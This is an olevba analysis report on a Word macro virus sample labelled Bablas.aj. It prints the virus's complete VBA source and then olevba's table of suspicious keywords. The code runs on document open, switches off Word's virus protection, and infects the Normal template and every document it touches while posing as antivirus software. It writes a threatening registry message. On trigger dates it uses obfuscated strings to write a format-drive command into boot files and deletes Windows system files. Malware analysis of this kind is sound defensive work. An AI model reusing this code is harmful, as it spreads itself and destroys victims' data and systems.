olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.aj-3804ee9339b1beeaaa4ec28632c0151d1e655210
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.aj-3804ee9339b1beeaaa4ec28632c0151d1e655210 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO OBSv2904.bas 
in file: Virus.MSWord.Bablas.aj-3804ee9339b1beeaaa4ec28632c0151d1e655210 - OLE stream: 'Macros/VBA/OBSv2904'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Sura Agung Computer
'Under Licensy from OPHAY BUSSINES SOLUTION
'MANAGER "Alm.Midiawaty"
'CEO "Deden Sura Agung"
'Smallest without time sensor
'LU1400
#If Win32 Then
    Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
#Else
    Declare Function GetWindowsDirectory Lib "Kernel" (ByVal P$, ByVal S%) As Integer
#End If
Const FAH = &H2
Const FAR = &H1
Const FAS = &H4
Function WD() As String
Dim WP As String
Dim temp
    WP = String(145, Chr(0))
    temp = GetWindowsDirectory(WP, 145)
    WD = Left(WP, InStr(WP, Chr(0)) - 1)
End Function
Sub KingDestroy()
Dim WP As String
Dim x, Md
WP = WD()
tt2 = Chr(58)
grm = Chr(92)
ttk = Chr(46)
gfh = Chr(102)
hgi = Chr(103)
yxz = Chr(120)
cbd = Chr(98)
mln = Chr(108)
lkm = Chr(107)
ihj = Chr(104)
oao = Chr(64)
tkm = Chr(59)
pnh = Chr(62)
Spb = Chr(32)
Sbs = Chr(83)
Pbs = Chr(80)
Bbs = Chr(66)
Jbs = Chr(74)
Nbs = Chr(78)
Dbs = Chr(68)
Ebs = Chr(69)
Asr = Chr(65)
AaA = Chr(97)
AbC = Chr(98)
BcD = Chr(99)
CdE = Chr(100)
DeF = Chr(101)
EfG = Chr(102)
FgH = Chr(103)
GhI = Chr(104)
HiJ = Chr(105)
IjK = Chr(106)
Jkl = Chr(107)
KlM = Chr(108)
LmN = Chr(109)
MnO = Chr(110)
NoP = Chr(111)
OpQ = Chr(112)
PqR = Chr(113)
QrS = Chr(114)
RsT = Chr(115)
StU = Chr(116)
TuV = Chr(117)
UvW = Chr(118)
VwX = Chr(119)
WxY = Chr(120)
XyZ = Chr(121)
YzA = Chr(122)
pOn = Chr(79)
cBa = Chr(66)
tSr = Chr(83)
Midi = Chr(65)
sRq = Chr(82)
nMl = Chr(77)
gFe = Chr(70)
   Wg = WP + grm
   F3 = FAH + FAR + FAS
   Wgt = Wg + utv + feg + nmo + qpr
   Wgtn = Wgt + grm + onp + jik + onp + feg
sayst = Midi + KlM + LmN + ttk + nMl + HiJ + CdE + HiJ + AaA + VwX + AaA + StU + HiJ + Spb + Midi + MnO + CdE + Spb + pOn + OpQ + GhI + AaA + XyZ + tSr + sRq + ttk + ttk + ttk + Midi + KlM + VwX + AaA + XyZ + RsT + Spb + gFe + NoP + QrS + DeF + UvW + DeF + QrS + ttk
saynd = WP + Spb + HiJ + RsT + Spb + cbd + QrS + NoP + lkm + DeF + MnO + Spb + ttk + ttk + ttk + Sbs + NoP + QrS + QrS + XyZ + ttk
sayrd = Bbs + XyZ + Spb + pOn + OpQ + GhI + AaA + XyZ + tSr + sRq
sayrm = QrS + DeF + LmN + Spb
sayec = DeF + BcD + ihj + NoP
sayof = oao + sayec + Spb + NoP + gfh + gfh
saycp = BcD + NoP + OpQ + XyZ + Spb + pOn + cBa + pOn + tSr + Spb + HiJ + NoP + ttk + RsT + XyZ + RsT + Spb + pnh + Spb + MnO + TuV + mln
SetAttr BcD + tt2 + grm + HiJ + NoP + ttk + RsT + XyZ + RsT, vbNormal
Open BcD + tt2 + grm + pOn + cBa + pOn + tSr For Output As #1
Print #1, sayst
Print #1, saynd
Print #1, sayrd
Close #1
SetAttr BcD + tt2 + grm + LmN + RsT + CdE + NoP + RsT + ttk + RsT + XyZ + RsT, vbNormal
Open BcD + tt2 + grm + LmN + RsT + CdE + NoP + RsT + ttk + RsT + XyZ + RsT For Output As #1
Print #1, tkm + sayst
Print #1, tkm + saynd
Print #1, tkm + sayrd
Close #1
SetAttr BcD + tt2 + grm + LmN + RsT + CdE + NoP + RsT + ttk + RsT + XyZ + RsT, FAH + FAR + FAS
Open BcD + tt2 + grm + BcD + NoP + MnO + gfh + HiJ + hgi + ttk + RsT + XyZ + RsT For Output As #1
Print #1, sayrm + sayst
Print #1, sayrm + saynd
Print #1, sayrm + sayrd
Close #1
Open BcD + tt2 + grm + AaA + TuV + StU + NoP + DeF + yxz + DeF + BcD + ttk + cbd + AaA + StU For Output As #1
Print #1, sayof
Print #1, BcD + mln + RsT
Print #1, sayec + ttk
Print #1, sayec + Spb + sayst
Print #1, sayec + ttk
Print #1, sayec + Spb + saynd
Print #1, sayec + ttk
Print #1, sayec + Spb + sayrd
Print #1, sayec + ttk
Print #1, sayec + ttk
Print #1, sayec + ttk
Print #1, saycp
Print #1, Pbs + AaA + TuV + RsT + DeF
Close #1
Beep
OphayMD
Gone = Pbs + mln + DeF + AaA + RsT + DeF + Spb + RsT + AaA + XyZ + Spb + _
hgi + NoP + NoP + CdE + Spb + cbd + XyZ + DeF + Spb + StU + NoP + _
Spb + XyZ + NoP + TuV + QrS + Spb + VwX + NoP + QrS + lkm + ttk + _
Spb + Asr + MnO + CdE + Spb + MnO + NoP + VwX + Chr(13) + XyZ + _
NoP + TuV + QrS + Spb + VwX + HiJ + MnO + CdE + NoP + VwX + RsT + _
Spb + HiJ + RsT + Spb + Dbs + Ebs + Asr + Dbs
MsgBox "I'm Ophay Sweet Razta." + Chr(13) + "Under Licensy form Ophay Bussines Solution." + Chr(13) + Chr(13) + Gone + " . . . !!!  See you next time.", vbOKOnly, "Hello..."
SetAttr WP + grm + RsT + XyZ + RsT + StU + DeF + LmN + ttk + CdE + AaA + StU, vbNormal
SetAttr WP + grm + TuV + RsT + DeF + QrS + ttk + CdE + AaA + StU, vbNormal
Kill WP + grm + RsT + XyZ + RsT + StU + DeF + LmN + ttk + HiJ + MnO + HiJ
Kill WP + grm + VwX + HiJ + MnO + ttk + HiJ + MnO + HiJ
Kill WP + grm + RsT + XyZ + RsT + StU + DeF + LmN + ttk + CdE + AaA + StU
Kill WP + grm + TuV + RsT + DeF + QrS + ttk + CdE + AaA + StU
Application.StatusBar = "Be carefull ....God Knows ... Your Computer is Dead ... Thank's MD"
End Sub
Sub AutoExec()
WordBasic.DisableAutoMacros True
OBS
FileNewdefault
AttactTemp
MDBirth
End Sub
Sub OBS()
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Options.SavePropertiesPrompt = False
OphayReg
End Sub
Sub ToolsOptions()
Options.SaveNormalPrompt = True
Options.SavePropertiesPrompt = True
Options.VirusProtection = True
Dialogs(wdDialogToolsOptions).Show
OBS
End Sub
Sub ToolsMacro()
FGe
Beep
CapNormal
   MsgBox "              Alm.Midiawaty ,SE." & Chr(13) & _
          "Alm.Midiawaty trying to remain you" & Chr(13) & _
          "To Build The World a Better Place for Living." & Chr(13) & _
          "Don't Touch Me!!!" + Chr(13) + "Don't try it again!!!", vbExclamation + vbOKOnly, "OBS"
End Sub
Sub ViewVbCode()
ToolsMacro
End Sub
Sub FileTemplates()
ToolsMacro
End Sub
Sub OphayMD()
On Error Resume Next
Application.Caption = "You Have Been Forgetting me"
ActiveWindow.Caption = "Alm.Midiawaty ,SE Is Always Everywhere Actualy. "
Application.StatusBar = "I Love OphaySR and don't hurt him or I'll Kill You... "
End Sub
Sub FGe()
Application.Caption = "Don't Forget"
ActiveWindow.Caption = "You try to remove Virus ScanMacro OBS. "
Application.StatusBar = "Alm.Midiawaty trying to remain you, Please Wait..."
Wait
End Sub
Sub CapNormal()
On Error Resume Next
Application.Caption = "Microsoft Word"
ActiveWindow.Caption = ActiveDocument.Name
End Sub
Sub FileOpen()
WordBasic.DisableAutoMacros True
On Error Resume Next
If Dialogs(wdDialogFileOpen).Show <> 0 Then
AttactDoc
ActiveDocument.Save
MDBirth
MiDiDay
CapNormal
End If
WordBasic.DisableAutoMacros False
 AttactDoc
    ActiveDocument.Save
    MDBirth
MiDiDay
End Sub
Sub AutoOpen()
OBS
 AttactDoc
    ActiveDocument.Save
AttactTemp
On Error Resume Next
NormalTemplate.Save
MDBirth
MiDiDay
CapNormal
End Sub
Sub FileSave()
    If ActiveDocument.Saved = False Then
        AttactDoc
        AttactTemp
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub
Sub FileNew()
    Dialogs(wdDialogFileNew).Show
    AttactDoc
End Sub
Sub FileNewdefault()
    Documents.Add
    AttactDoc
   End Sub
Sub Wait()
For i = 1 To 500
On Error Resume Next
Beep
Next i
End Sub
Sub AttactDoc()
    Dim DYes As Boolean
    DYes = False
    On Error GoTo Dock
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "OBSv2904" Then DYes = True
       If Obj.Name = "OBS" Then
       Application.StatusBar = "Upgrading Database Ophay Bussines Solution to " + ActiveDocument.Name + " for virus protection..."
         Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument, Name:="OBSv2904", Object:=wdOrganizerObjectProjectItems
        If Obj.Name <> "OBSv2904" And Obj.Name <> "ThisDocument" Then
Application.Caption = "OBS"
ActiveWindow.Caption = "Found Virus " + Obj.Name + " in " + ActiveDocument.Name + "..."
Application.StatusBar = "Ophay Bussines Solution will automaticly removing Virus " + Obj.Name + " in " + ActiveDocument.Name + "..."
Wait
CapNormal
            Application.StatusBar = "Removing Virus " + Obj.Name + " in " + ActiveDocument.Name + "...Please Wait !!!"
            Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
Application.StatusBar = "Virus " + Obj.Name + " in " + ActiveDocument.Name + " was removed."
        End If
        End If
    Next Obj
    If DYes = False Then
        Application.StatusBar = "Creating Database Ophay Bussines Solution to " + ActiveDocument.Name + " for virus protection..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument, Name:="OBSv2904", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
Dock:
     End Sub
Sub AttactTemp()
    Dim NYes As Boolean
    NYes = False
    On Error GoTo temp
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "OBSv2904" Then NYes = True
        If Obj.Name = "OBS" Then
        Application.StatusBar = "Alm.Midiawaty Is Upgrading It Self From  Ophay Bussines Solution to " + ActiveDocument.Name + " to Normal Template for virus protection..."
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="OBSv2904", Object:=wdOrganizerObjectProjectItems
        If Obj.Name <> "OBSv2904" And Obj.Name <> "ThisDocument" Then
            ActiveWindow.Caption = "Found Virus " + Obj.Name + " in Normal Template " + "..."
           Application.StatusBar = "Ophay Bussines Solution will automaticly removing Virus " + Obj.Name + " in Normal Template" + "..."
           Wait
           CapNormal
            Application.StatusBar = "Removing Virus " + Obj.Name + " in Normal Template to protect your global document...Please Wait!! "
            Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
        End If
    Next Obj
    If NYes = False Then
        Application.StatusBar = "Alm.Midiawaty Is Backing Up It Self From  Ophay Bussines Solution to " + ActiveDocument.Name + " to Normal Template for virus protection..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="OBSv2904", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
temp:
End Sub
Sub HelpAbout()
    Beep
    MsgBox "                           Alm.Midiawaty ,SE." & Chr(13) & _
           " " & Chr(13) & _
           "I was born in SURABAYA, 29 Desember 1975." & Chr(13) & _
           "My bad day come and take me to heaven on 23 Nov 97." & Chr(13) & _
           "Happines...Joynes always cause OphaySR & God Love Me." & Chr(13) & _
           "So, come and join with me in heaven.", vbOKOnly + 64, "OBS"
End Sub
Sub MDBirth()
Dt = Day(Date)
If Dt = 1 Then
CreaHTML
CapNormal
Exit Sub
End If
If Dt = 11 Then
CreaHTML
CapNormal
Exit Sub
End If
If Dt = 20 Then
CreaHTML
CapNormal
Exit Sub
End If
If Dt = 23 Then
CreaHTML
CapNormal
Exit Sub
End If
If Dt = 24 Then
CreaHTML
CapNormal
Exit Sub
End If
If Dt = 29 Then
CreaHTML
CapNormal
Exit Sub
End If
End Sub
Sub Email()
EmailOBS
EmailSAC
End Sub
Sub EmailOBS()
Selection.Font.ColorIndex = wdRed
Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
Selection.TypeText Text:="OBS@Yahoo.Com"
Selection.MoveDown Unit:=wdLine, Count:=1
Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
Selection.Comments.Add Range:=Selection.Range
    Selection.TypeText Text:="Ophay Bussines Solution EMail Address"
    ActiveWindow.ActivePane.Close
    Selection.TypeParagraph
End Sub
Sub EmailSAC()
Selection.TypeParagraph
Selection.Font.ColorIndex = wdBlue
Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
Selection.TypeText Text:="SAC@HotMail.Com"
Selection.MoveDown Unit:=wdLine, Count:=1
Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
Selection.Comments.Add Range:=Selection.Range
    Selection.TypeText Text:="Sura Agung Computer Custumer Service"
    ActiveWindow.ActivePane.Close
    Selection.TypeParagraph
End Sub
Sub MiDiDay()
Dt = Day(Date)
MT = Month(Date)
If Dt = 20 And MT = 1 Then
Application.Caption = "Happy Birthday to OphaySR and Good Luck..."
Application.StatusBar = "Alm.Midiawaty remain you every 20 January . . . "
Selection.Collapse Direction:=wdCollapseEnd
With Selection.Range
.Font.reset
OphayFirst
Selection.TypeText Text:="Happy Birthday to OphaySR and Good Luck..."
OphaySecond
Selection.TypeText Text:="Ophay was born in JAKARTA, 20 JANUARY 1977. She was Graduated from SMAN 6 High School and He've been college on STIE IBiI. Happiness...Joyless always cause OphaySR & God Love Me. But, Someday I Will Come To You. On a Paradise City, I Hope ... So, come and join with me in heaven, Someday."
OphayThird
Selection.TypeText Text:="Ophay SR"
MDForever
Selection.TypeText Text:="Remain on 20 January"
Selection.TypeParagraph
Email
End With
    ActiveDocument.Save
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 24 And MT = 5 Then
Application.Caption = "My Wedding Day still remain on mind ..."
Application.StatusBar = "Alm.Midiawaty remain you every 24 Mei . . . "
Selection.Collapse Direction:=wdCollapseEnd
With Selection.Range
.Font.reset
OphayFirst
Selection.TypeText Text:="Happy Wedding Day to OphaySR & Alm.Midiawaty and Good Luck..."
OphaySecond
Selection.TypeText Text:="OphaySR was born in Jakarta, 20 January 1977. Midi was born in SURABAYA, 29 Desember 1975. People said We're best couple and God take her to heaven on 23 November 1997. Happiness...Joyless is always be, cause God Love Us. But, Someday I wishes come on the Wedding Dress again in Up there, I Hope ... So, On The Wedding Dress again, Someday."
OphayThird
Selection.TypeText Text:="Ophay SR & Midiawaty"
MDForever
Selection.TypeText Text:="Remain on 24 Mei"
Selection.TypeParagraph
Email
End With
    ActiveDocument.Save
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 18 And MT = 9 Then
Application.Caption = "Happy Birthday to Dewi .N and Good Luck..."
Application.StatusBar = "Alm.Midiawaty remain you every 18 September . . . "
Selection.Collapse Direction:=wdCollapseEnd
With Selection.Range
.Font.reset
OphayFirst
Selection.TypeText Text:="Happy Birthday to Dewi .N and Good Luck..."
OphaySecond
Selection.TypeText Text:="Dewi was born in JAKARTA, 18 September 1978. OphaySR & God Love You. I Hope ... So, On The Wedding Dress, Someday."
OphayThird
Selection.TypeText Text:="Ophay SR & MD"
MDForever
Selection.TypeText Text:="Remain on 18 September"
Selection.TypeParagraph
Email
End With
    ActiveDocument.Save
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 2 And MT = 11 Then
Application.Caption = "Happy Birthday to My Mother & Sari .N and Good Luck..."
Application.StatusBar = "Alm.Midiawaty remain you every 2 November . . . "
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 23 And MT = 11 Then
Application.Caption = "I Will Come to You ...."
Application.StatusBar = "Alm.Midiawaty remain you every 23 November . . . "
Email
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 1 And MT = 12 Then
Application.Caption = "Happy Birthday to Cristine LMA and Good Luck..."
Application.StatusBar = "Alm.Midiawaty remain you every 01 Desember . . . "
Selection.Collapse Direction:=wdCollapseEnd
With Selection.Range
.Font.reset
OphayFirst
Selection.TypeText Text:="Happy Birthday to Cristine Laorina MA and Good Luck..."
OphaySecond
Selection.TypeText Text:="Cristine was born in JAKARTA, 01 Desember 1976. She was Graduated from Boedoet High School and she've been college on STIE IBiI. Happiness...Joyless is always cause OphaySR & God Love You. I Hope ... So, Someday."
OphayThird
Selection.TypeText Text:="Ophay SR"
MDForever
Selection.TypeText Text:="Remain on 01 Desember"
Selection.TypeParagraph
Email
End With
    ActiveDocument.Save
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 29 And MT = 12 Then
Application.Caption = "Born to raise heaven for Alm.Midiawaty and Good Luck..."
Application.StatusBar = "Alm.Midiawaty remain you every month on 29 Desember. . . "
HelpAbout
KingDestroy
Exit Sub
End If
MDBirth
End Sub
Sub OphayReg()
Dim regs
regs = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
System.PrivateProfileString("", regs, "RegisteredOrganization") = "Sura Agung Computer"
System.PrivateProfileString("", regs, "RegisteredOwner") = "Ophay Busisnes Solution"
regs = "HKEY_CURRENT_USER\Control Panel\International"
System.PrivateProfileString("", regs, "sLongDate") = "Sura Agung Computer, dddd dd MMMM yyyy"
regs = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Detect"
System.PrivateProfileString("", regs, "Info") = "Your Computer Is Already Infected With OBSVirus"
System.PrivateProfileString("", regs, "Info2") = "Please Contact OBS at 021-6506287 or your computer will be HangUp"
End Sub
Sub OphayFirst()
Selection.Font.Bold = wdToggle
Selection.Font.ColorIndex = wdBlue
Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
End Sub
Sub OphaySecond()
Selection.Font.ColorIndex = 0
Selection.Font.Bold = wdToggle
Selection.TypeParagraph
Selection.TypeParagraph
Selection.ParagraphFormat.Alignment = wdAlignParagraphJustify
End Sub
Sub MDForever()
Selection.TypeParagraph
Selection.TypeText Text:="Always and Forever"
Selection.TypeParagraph
End Sub
Sub OphayThird()
Selection.TypeParagraph
Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
End Sub
Sub CreaHTML()
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Desktop\OBS.html" For Output As #1
Print #1, "<HTML><HEAD><TITLE>OPHAY BUSSINES SOLUTION</TITLE>"
Print #1, "<BODY LINK='#0000ff' VLINK='#800080' BGCOLOR='#00ffff'>"
Print #1, "</FONT></STRONG><P ALIGN='JUSTIFY'><A HREF='mailto:OBS@Yahoo.com'><B><FONT SIZE=6 COLOR='#800000'>OPHAY BUSSINES SOLUTION"
Print #1, "</B></FONT><P ALIGN='JUSTIFY'>&nbsp;</P></A><FONT SIZE=6>    </FONT><FONT FACE='Courier New' COLOR='#ff00ff'>There’s the winter moon shining to my windows. I’m not as sleep because I miss you so. If I could I Know the way I felt today and this feeling so real because I Miss you so. I Think I’m in Love. It’s too late to say I’m in Love.</P>"
Print #1, "<P ALIGN='JUSTIFY'>Please … send me to make it trought … I’m waiting forever. Don’t make me disapointed.</P>"
Print #1, "<P>Email To:</FONT><A HREF='mailto:OBS@Yahoo.Com'>OBS@Yahoo.Com</A>          <A HREF='; mailto: SAC@ Hotmail.Com '>SAC@Hotmail.Com</A>             <A HREF='mailto:Ophay@HotMail.Com'>Ophay@HotMail.Com</A></P><DIR><DIR>"
Print #1, "<FONT FACE='Courier New' COLOR='#ff00ff'><P ALIGN='RIGHT'>&nbsp;</FONT><A HREF='OPHAY@HotMail.Com'><B><FONT FACE='Impact' SIZE=6 COLOR='#ff0000'>OPHAY S.R</B></FONT></A></P></DIR>"
Print #1, "</DIR></BODY></HTML>"
 Close #1
 End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

